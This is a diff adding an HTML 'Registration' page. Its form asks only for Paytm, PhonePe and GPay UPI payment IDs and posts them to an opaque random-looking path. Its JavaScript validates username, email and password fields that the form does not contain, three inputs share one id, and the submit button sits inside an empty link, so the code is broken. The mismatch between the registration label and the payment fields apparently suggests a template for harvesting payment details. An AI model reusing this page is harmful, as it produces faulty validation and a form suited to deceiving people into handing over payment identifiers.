@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>| Register |</title>
+    <link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/AlertifyJS/1.13.1/css/alertify.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/AlertifyJS/1.13.1/css/themes/default.min.css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <style>
+      @import url('https://fonts.googleapis.com/css?family=Poppins:400,500,600,700&display=swap');
+*{
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Poppins', sans-serif;
+}
+body{
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #ddd;
+}
+.wrapper{
+  position: relative;
+  max-width: 430px;
+  width: 100%;
+  background: #fff;
+  padding: 34px;
+  border-radius: 6px;
+  box-shadow: 0 5px 10px rgba(0,0,0,0.2);
+}
+.wrapper h2{
+  position: relative;
+  font-size: 22px;
+  font-weight: 600;
+  color: #333;
+}
+.wrapper h2::before{
+  content: '';
+  position: absolute;
+  left: 0;
+  bottom: 0;
+  height: 3px;
+  width: 28px;
+  border-radius: 12px;
+  background: #4070f4;
+}
+.wrapper form{
+  margin-top: 30px;
+}
+.wrapper form .input-box{
+  height: 52px;
+  margin: 18px 0;
+}
+form .input-box input{
+  height: 100%;
+  width: 100%;
+  outline: none;
+  padding: 0 15px;
+  font-size: 17px;
+  font-weight: 400;
+  color: #333;
+  border: 1.5px solid #C7BEBE;
+  border-bottom-width: 2.5px;
+  border-radius: 6px;
+  transition: all 0.3s ease;
+}
+.input-box input:focus,
+.input-box input:valid{
+  border-color: #4070f4;
+}
+form .policy{
+  display: flex;
+  align-items: center;
+}
+form h3{
+  color: #707070;
+  font-size: 14px;
+  font-weight: 500;
+  margin-left: 10px;
+}
+.input-box.button input{
+  color: #fff;
+  letter-spacing: 1px;
+  border: none;
+  background: #4070f4;
+  cursor: pointer;
+}
+.input-box.button input:hover{
+  background: #4070f4;
+}
+form .text h3{
+ color: #333;
+ width: 100%;
+ text-align: center;
+}
+form .text h3 a{
+  color: #4070f4;
+  text-decoration: none;
+}
+form .text h3 a:hover{
+  text-decoration: underline;
+}
+.error{
+  color: red;
+}
+    </style>
+
+    <script>
+        function validateForm() {
+          let username = document.forms["myForm"]["username"].value;
+          let email = document.forms["myForm"]["email"].value;
+          let password = document.forms["myForm"]["password"].value;
+          let conform_password = document.forms["myForm"]["conform_password"].value;
+
+          let unerror = document.getElementById('username-error');
+          let paerror = document.getElementById('password-error');
+          let cpaerror = document.getElementById('conform_password-error');
+          let emerror = document.getElementById('email-error');
+ 
+          let uninput = document.getElementById('username-input');
+          let painput = document.getElementById('password-input');
+          let cpainput = document.getElementById('conform_password-input');
+          let eminput = document.getElementById('email-input');
+          
+          uninput.addEventListener("focus" , ()=>{
+            unerror.innerText = '';
+          })
+          painput.addEventListener("focus" , ()=>{
+            paerror.innerText = '';
+          })
+          cpainput.addEventListener("focus" , ()=>{
+            cpaerror.innerText = '';
+          })
+          eminput.addEventListener("focus" , ()=>{
+            emerror.innerText = ''; 
+          })
+
+          if (username == "") {
+            unerror.innerText = "username must be filled out !"
+            return (false)
+          }
+          if (email == "") {
+            emerror.innerText = "email must be filled out !"
+            return (false)
+          }
+          if (!(/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email)))
+          {
+          emerror.innerText = "enter valid email adress !"
+          return (false)
+          }
+          if (password == "") {
+            paerror.innerText = "password must be filled out !"
+            return (false)
+          }
+          if (password.length < 6) {
+            paerror.innerText = "Password must be 6 character !"
+            return (false)
+          }
+          if (conform_password == "") {
+            cpaerror.innerText = "conform_password must be filled out !"
+            return (false)
+          }
+          if (password != conform_password) {
+            cpaerror.innerText = "conform Password are Not same !"
+            return (false)
+          }
+          return(true)
+        }
+        </script>
+
+</head>
+<body>
+    <div class="wrapper">
+      <h2>Registration</h2>
+      <form action="/flNV8wTb98kvr05PNRX80STd8VxBobn0AJKCd6im" method="post" name="myForm" onsubmit="return validateForm()">
+        <div class="input-box">
+          <input name="paytm_upi_id" type="text" placeholder="Enter your paytm_upi_id" id="username-input" >
+        </div>
+        <span id="username-error" class="error" ></span>
+        <div class="input-box">
+            <input name="phonepe_upi_id" type="text" placeholder="Enter your phonepe_upi_id" id="username-input" >
+          </div>
+          <span id="username-error" class="error" ></span>
+          <div class="input-box">
+            <input name="gpay_upi_id" type="text" placeholder="Enter your gpay_upi_id" id="username-input" >
+          </div>
+          <span id="username-error" class="error" ></span>
+        <span id="conform_password-error" class="error" ></span>
+        <a href="">
+        <div class="input-box button">
+          <input type="Submit" value="Continue">
+        </div>
+    </a>
+      </form>
+    </div>
+  </body>
+</html>
